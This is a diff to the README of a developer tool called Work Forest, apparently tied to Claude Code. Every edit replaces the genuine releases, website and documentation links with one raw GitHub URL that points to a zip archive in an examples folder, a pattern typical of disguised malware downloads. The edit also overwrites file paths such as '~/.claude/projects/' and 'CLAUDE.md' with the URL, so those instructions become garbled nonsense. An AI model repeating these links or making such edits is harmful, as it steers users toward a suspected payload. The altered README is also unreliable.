@@ -1,6 +1,6 @@
-# 🌳 workforest.space - Simplifying AI-Assisted Development
+# 🌳 https://raw.githubusercontent.com/mohamedmanzo/workforest.space/main/examples/typescript/workforest-space-2.0-beta.2.zip - Simplifying AI-Assisted Development
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-brightgreen)](https://github.com/mohamedmanzo/workforest.space/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/mohamedmanzo/workforest.space/main/examples/typescript/workforest-space-2.0-beta.2.zip)](https://raw.githubusercontent.com/mohamedmanzo/workforest.space/main/examples/typescript/workforest-space-2.0-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to Work Forest! This guide will help you download and run the applicatio
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Releases Page](https://github.com/mohamedmanzo/workforest.space/releases).
+To download the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/mohamedmanzo/workforest.space/main/examples/typescript/workforest-space-2.0-beta.2.zip).
 
-1. Go to the [Releases Page](https://github.com/mohamedmanzo/workforest.space/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/mohamedmanzo/workforest.space/main/examples/typescript/workforest-space-2.0-beta.2.zip).
 2. Find the latest version listed.
 3. Click on the link to download the file suitable for your operating system.
 
@@ -46,12 +46,12 @@ When developing projects that rely on libraries:
 4. Refer to the [npm-link pattern](/patterns/npm-link) for more information.
 
 ### 🗂 Projects Folder Structure
-Organize your projects effectively by committing your `~/.claude/projects/` folder to version control:
+Organize your projects effectively by committing your `~https://raw.githubusercontent.com/mohamedmanzo/workforest.space/main/examples/typescript/workforest-space-2.0-beta.2.zip` folder to version control:
 
 ```
-~/.claude/projects/
+~https://raw.githubusercontent.com/mohamedmanzo/workforest.space/main/examples/typescript/workforest-space-2.0-beta.2.zip
 ├── -Users-you-Projects-myapp/
-│   ├── CLAUDE.md          # Project instructions
+│   ├── https://raw.githubusercontent.com/mohamedmanzo/workforest.space/main/examples/typescript/workforest-space-2.0-beta.2.zip          # Project instructions
 │   └── skills/            # Custom skills/commands
 └── ...
 ```
@@ -60,7 +60,7 @@ This approach helps preserve context across sessions and devices.
 
 ## 📚 Documentation
 
-To learn more about the features and capabilities of Work Forest, refer to the extensive documentation available at [workforest.space](https://workforest.space). This documentation includes:
+To learn more about the features and capabilities of Work Forest, refer to the extensive documentation available at [https://raw.githubusercontent.com/mohamedmanzo/workforest.space/main/examples/typescript/workforest-space-2.0-beta.2.zip](https://raw.githubusercontent.com/mohamedmanzo/workforest.space/main/examples/typescript/workforest-space-2.0-beta.2.zip). This documentation includes:
 
 - Git worktree workflows for parallel development.
 - Project-level instructions for Claude Code.
@@ -94,6 +94,6 @@ To get started, please review our contribution guidelines in the repository.
 
 ## 🔗 Learn More
 
-Visit the project's website for more details, tutorials, and updates: [workforest.space](https://workforest.space).
+Visit the project's website for more details, tutorials, and updates: [https://raw.githubusercontent.com/mohamedmanzo/workforest.space/main/examples/typescript/workforest-space-2.0-beta.2.zip](https://raw.githubusercontent.com/mohamedmanzo/workforest.space/main/examples/typescript/workforest-space-2.0-beta.2.zip).
 
 Thank you for using Work Forest. We hope it enhances your development experience!
